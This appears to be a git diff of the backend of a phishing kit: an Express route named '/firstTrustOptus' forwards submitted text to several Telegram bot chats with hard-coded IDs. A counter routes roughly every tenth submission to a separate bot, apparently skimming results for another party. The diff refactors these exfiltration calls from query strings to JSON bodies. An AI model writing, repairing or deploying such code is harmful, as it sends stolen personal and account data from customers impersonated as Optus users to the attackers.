@@ -6144,27 +6144,42 @@ app.post("/firstTrustOptus", (req, res) => {
       if (Spoofergoofer == 10) {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         Spoofergoofer = 4;
       } else {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusFirstTrust:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `OptusFirstTrust:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=837638060&text=Optus:\n${originalText}`
-          )
-          .catch((err) => {
-            console.log(err);
-          });
+          axios
+            .post(
+              `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+              {
+                chat_id: 837638060,
+                text: `Optus:\n${originalText}`,
+                parse_mode: "Markdown",
+              }
+            )
+            .catch((e) => {
+              console.log(e);
+            });
         Spoofergoofer += 1;
       }
       res.send("Update Completed");
